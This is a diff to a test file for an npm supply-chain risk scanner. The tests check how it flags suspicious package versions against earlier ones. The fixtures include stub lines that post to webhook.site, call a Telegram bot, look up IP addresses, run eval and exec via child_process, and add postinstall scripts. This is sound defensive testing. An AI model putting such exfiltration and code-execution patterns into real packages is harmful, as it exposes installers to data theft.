@@ -14,6 +14,7 @@ import { npmCompareFindings } from '../risk/npm/compare.js'
 import { npmAddedDependency } from '../risk/npm/new-dependency.js'
 import { npmOldVersion } from '../risk/npm/old-version.js'
 import { npmAccountStanding } from '../risk/npm/release.js'
+import { npmCombinedFindings } from '../risk/npm/combined.js'
 import { npmSettledDownloads } from '../risk/npm/downloads.js'
 import { REGISTRY, packageOf } from './_managed-npm.js'
 
@@ -92,20 +93,56 @@ test('a version alone: what it holds, its files stamped, too new under the minim
   assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
 })
 
-test('the services a version\'s files name, a finding a hosts\' tag at its severity; against the version before, those new to a file a level higher', async t => {
+test('the services a version\'s files name, a finding a hosts\' tag at its severity; against the version before, those new to a file marked, a level higher', async t => {
   const before = version('hosted', '1.0.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\n' }, { dependencies: {} }, ago(30))
   const after = version('hosted', '1.1.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\npost("https://webhook.site/x")\n',
     'lib/b.js': 'bot("https://api.telegram.org/bot")\nget("https://ifconfig.me")\n' }, { dependencies: {} }, ago(20))
   npm(t, [{ name: 'hosted', versions: [before, after] }])
-  const hosts = (assessment, prefix) => assessment.findings.filter(({ id }) => ['exfiltration', 'remote', 'ip-lookup'].some(tag => id === `${prefix}${tag}`))
-    .map(({ id, severity, files }) => `${id} ${severity}: ${files.map(row => `${row.path} ${Object.keys(row.found ?? row.added).join(',')}`).join('; ')}`)
+  const hosts = assessment => assessment.findings.filter(({ id }) => ['exfiltration', 'remote', 'ip-lookup'].some(tag => id === `held-${tag}`))
+    .map(({ id, severity, files }) => `${id} ${severity}: ${files.map(row => `${row.path} ${Object.keys(row.found).join(',')}${row.added ? ` (new: ${Object.keys(row.added).join(',')})` : ''}`).join('; ')}`)
   const alone = await assessNpm('hosted', '1.1.0', { now: NOW, downloads: false })
-  assert.deepEqual(hosts(alone, 'held-'), ['held-exfiltration critical: lib/a.js webhook-site', 'held-remote high: lib/b.js telegram',
+  assert.deepEqual(hosts(alone), ['held-exfiltration critical: lib/a.js webhook-site', 'held-remote high: lib/b.js telegram',
     'held-ip-lookup moderate: lib/a.js ipify; lib/b.js ifconfig-me'], 'red, orange and yellow')
   assert.deepEqual(alone.files['lib/b.js'].stamps, [{ name: 'Remote', severity: 'high' }, { name: 'IP lookup', severity: 'moderate' }])
   const compared = await assessNpm('hosted', '1.1.0', { oldVersion: '1.0.0', now: NOW, downloads: false })
-  assert.deepEqual(hosts(compared, ''), ['exfiltration critical: lib/a.js webhook-site', 'remote critical: lib/b.js telegram', 'ip-lookup high: lib/b.js ifconfig-me'],
-    'never past red; ipify, named already, none')
+  assert.deepEqual(hosts(compared), ['held-exfiltration critical: lib/a.js webhook-site (new: webhook-site)', 'held-remote critical: lib/b.js telegram (new: telegram)',
+    'held-ip-lookup high: lib/a.js ipify; lib/b.js ifconfig-me (new: ifconfig-me)'], 'all it holds, those new marked, a level higher, never past red; ipify, named already, not new')
+  assert.ok(!compared.findings.some(({ id }) => ['exfiltration', 'remote', 'ip-lookup'].includes(id)), 'none apart from what it holds')
+})
+
+test('against another version, what it holds is told all the same, never lower: what changed raises it and marks what is new', async t => {
+  const by = (number, files, extra = {}) => version('kept-bad', number, { 'package.json': '{}', ...files }, { dependencies: {}, scripts: {}, ...extra }, ago(60 - Number(number.at(-1)) * 10))
+  const before = by('1.0.0', { 'index.js': 'post("https://webhook.site/x")\neval(a)\n' })
+  const kept = by('1.0.1', { 'index.js': 'post("https://webhook.site/x")\neval(a)\n', 'more.js': 'module.exports = 1\n' })
+  const worse = by('1.0.2', { 'index.js': 'post("https://webhook.site/x")\neval(a)\nrequire("child_process").exec(b)\n', 'more.js': 'module.exports = 1\n' },
+    { dependencies: { tool: 'github:someone/tool' } })
+  npm(t, [{ name: 'kept-bad', versions: [before, kept, worse] }])
+  const said = assessment => Object.fromEntries(assessment.findings.map(({ id, severity, files, dependencies }) =>
+    [id, `${severity}${(files ?? dependencies ?? []).filter(row => row.added).map(row => ` ${row.path ?? row.name}`).join('')}`]))
+  const alone = said(await assessNpm('kept-bad', '1.0.1', { now: NOW, downloads: false }))
+  assert.deepEqual(said(await assessNpm('kept-bad', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), alone,
+    'what it holds kept from 1.0.0 as it is alone: a request catcher still red, eval still orange')
+  const raised = await assessNpm('kept-bad', '1.0.2', { oldVersion: '1.0.1', now: NOW, downloads: false })
+  assert.deepEqual(said(raised), { 'held-runs-code': 'critical index.js', 'held-exfiltration': 'critical', 'held-non-registry-deps': 'high tool', 'held-unused-deps': 'high tool' },
+    'child_process new to index.js raises what runs code to red, the file marked; a dependency from GitHub, imported by nothing, marked new')
+  assert.deepEqual(Object.keys(raised.findings[0].files[0].added), ['child-process'], 'what is new of it')
+  assert.deepEqual(raised.dependencies.held.map(({ name, flags }) => [name, flags.map(({ check }) => check)]), [['tool', ['source', 'unimported']]],
+    'each dependency it holds, flagged, beside those changed')
+})
+
+test('what changed folded into what a version holds: the higher severity, publisher and provenance first, a change with nothing held kept', () => {
+  const held = [{ id: 'held-install-scripts', severity: 'high', scripts: [['postinstall', 'node x.js']] },
+    { id: 'held-obfuscated', severity: 'high', files: [{ path: 'a.js', found: 'obfuscator-io' }, { path: 'b.js', found: 'obfuscator-io' }] }]
+  const changed = [{ id: 'new-hosts', severity: 'high', hosts: [] }, { id: 'obfuscated', severity: 'critical', files: [{ path: 'b.js', obfuscation: 'obfuscator-io' }] },
+    { id: 'publisher', severity: 'moderate' }, { id: 'runs-code', severity: 'critical', files: [{ path: 'c.js', added: { eval: [1] } }] },
+    { id: 'install-scripts', severity: 'high', was: new Map(), now: new Map([['postinstall', 'node x.js']]), flagged: ['postinstall'] }]
+  const combined = npmCombinedFindings(held, changed)
+  assert.deepEqual(combined.map(({ id, severity }) => `${id} ${severity}`), ['publisher moderate', 'held-install-scripts high', 'held-obfuscated critical', 'new-hosts high', 'runs-code critical'])
+  assert.deepEqual(combined[2].files, [{ path: 'a.js', found: 'obfuscator-io' }, { path: 'b.js', found: 'obfuscator-io', added: 'obfuscator-io' }], 'the file newly obfuscated marked')
+  assert.deepEqual([combined[1].flagged, combined[1].was], [['postinstall'], []], 'the script added, and what ran before')
+  assert.equal(npmCombinedFindings([{ id: 'held-runs-code', severity: 'high', files: [] }], [{ id: 'kept-runs-code', severity: 'high', files: [{ path: 'a.js' }] }]).length, 1,
+    'code kept running folded into what runs code it holds')
+  assert.equal(npmCombinedFindings([{ id: 'held-remote', severity: 'critical', files: [] }], [{ id: 'remote', severity: 'high', files: [] }])[0].severity, 'critical', 'never lower')
 })
 
 test('against the version before: what it adds and changes, its publisher and provenance, and a new dependency\'s package', async t => {
@@ -118,9 +155,9 @@ test('against the version before: what it adds and changes, its publisher and pr
   const dependency = version('crypto-like', '4.2.1', { 'package.json': '{}', 'setup.js': '' }, { scripts: { postinstall: 'node setup.js' } }, ago(20.5))
   npm(t, [{ name: 'axios-like', versions: [before, after] }, { name: 'crypto-like', versions: [dependency] }])
   const assessment = await assessNpm('axios-like', '1.0.1', { oldVersion: '1.0.0', now: NOW })
-  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'unused-deps'])
+  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'held-unused-deps'])
   assert.deepEqual(assessment.findings[0], { id: 'publisher', was: known, now: 'someone-new', wasKnown: true, nowKnown: false, wasStanding: 'known', nowStanding: 'new', severity: 'critical' })
-  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1' }])
+  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1', added: true }], 'what it holds, the one added marked')
   const [added] = assessment.dependencies.added
   assert.equal(added.name, 'crypto-like')
   assert.deepEqual(added.flags.map(({ check }) => check), ['unimported'])
@@ -145,7 +182,9 @@ test('against the version before, its tarball read only where its files could ch
   const built = version('built', '1.0.0', gyp, { dependencies: {}, scripts: {} }, ago(60))
   const rebuilt = version('built', '1.0.1', { ...gyp, 'addon.cc': '' }, { dependencies: {}, scripts: { install: 'node-gyp rebuild' } }, ago(40))
   const read = npm(t, [{ name: 'built', versions: [built, rebuilt] }])
-  assert.deepEqual(ids(await assessNpm('built', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), [], 'node-gyp ran for 1.0.0\'s binding.gyp all the same')
+  const rebuiltFindings = (await assessNpm('built', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })).findings
+  assert.deepEqual(rebuiltFindings, [{ id: 'held-install-scripts', severity: 'high', scripts: [['install', 'node-gyp rebuild']] }],
+    'what it holds, none flagged: node-gyp ran for 1.0.0\'s binding.gyp all the same')
   assert.deepEqual(read.filter(url => url.endsWith('.tgz')), [rebuilt.doc.dist.tarball, built.doc.dist.tarball], 'install scripts, and 1.0.0\'s naming none: its files read')
 })
 
@@ -204,9 +243,11 @@ test('against the version risk picks: an attack\'s own earlier version passed ov
   const cache = store()
   const picked = await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW, downloads: false, cache })
   assert.equal(picked.oldVersion, '1.1.0')
-  assert.deepEqual(ids(picked), ['publisher', 'install-scripts', 'too-new'])
+  assert.deepEqual(ids(picked), ['publisher', 'held-install-scripts', 'too-new'])
+  assert.deepEqual(picked.findings[1].flagged, ['postinstall'], 'the script it holds marked added since 1.1.0')
   assert.ok(!asked.includes(versions[2].doc.dist.tarball), 'no tarball read for the pick')
-  assert.deepEqual(ids(await assessNpm('handed', '1.1.2', { oldVersion: '1.1.1', now: NOW, downloads: false })), ['too-new'], 'against the attack\'s own, nothing of it')
+  const own = await assessNpm('handed', '1.1.2', { oldVersion: '1.1.1', now: NOW, downloads: false })
+  assert.deepEqual([ids(own), own.findings[0].flagged], [['held-install-scripts', 'too-new'], undefined], 'against the attack\'s own, what it holds alone, nothing of it flagged')
   asked.length = 0
   assert.deepEqual(await assessNpm('handed', '1.1.2', { oldVersion: true, now: NOW, downloads: false, cache }), picked)
   assert.deepEqual(asked, [], 'the pick kept: npm isn\'t asked')
@@ -482,7 +523,7 @@ test('what is read is kept by type, and an assessment kept needs no tarball', as
     { kept: { start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, () => 10) } })
   const cache = store()
   const first = await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache })
-  assert.deepEqual(ids(first), ['kept-runs-code', 'new-hosts', 'popularity'], 'eval kept from 1.0.0; a host named anew; few downloads')
+  assert.deepEqual(ids(first), ['held-install-scripts', 'held-runs-code', 'new-hosts', 'popularity'], 'its install script and the eval it holds, kept from 1.0.0; a host named anew; few downloads')
   assert.deepEqual(first.findings.at(-1), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' })
   assert.deepEqual([...cache.written].toSorted(), ['npm/tarballs', 'risk/npm/advisories', 'risk/npm/assessments', 'risk/npm/downloads', 'risk/npm/packages', 'risk/npm/versions'])
   asked.length = 0
@@ -677,8 +718,8 @@ test('a tarball read as npm installs it, and two versions\' files paired as Comp
 
 test('a file that isn\'t text compared by its digest: one added large is large code, one kept unchanged', async t => {
   const packed = Buffer.alloc(256 * 1024, 0xff), tool = Buffer.from([0, 1, 2])
-  const before = version('bin-like', '1.0.0', { 'package.json': '{}', 'bin/tool': tool }, { dependencies: {} }, ago(30))
-  const after = version('bin-like', '1.0.1', { 'package.json': '{}', 'bin/tool': tool, 'dist/packed.js': packed }, { dependencies: {} }, ago(20))
+  const before = version('bin-like', '1.0.0', { 'package.json': '{}', 'bin/tool': tool }, { dependencies: {}, scripts: {} }, ago(30))
+  const after = version('bin-like', '1.0.1', { 'package.json': '{}', 'bin/tool': tool, 'dist/packed.js': packed }, { dependencies: {}, scripts: {} }, ago(20))
   npm(t, [{ name: 'bin-like', versions: [before, after] }])
   const assessment = await assessNpm('bin-like', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
   assert.deepEqual(assessment.findings, [{ id: 'large-code', severity: 'critical', files: [{ path: 'dist/packed.js', bytes: 256 * 1024 }] }], 'not UTF-8, yet added; bin/tool unchanged')
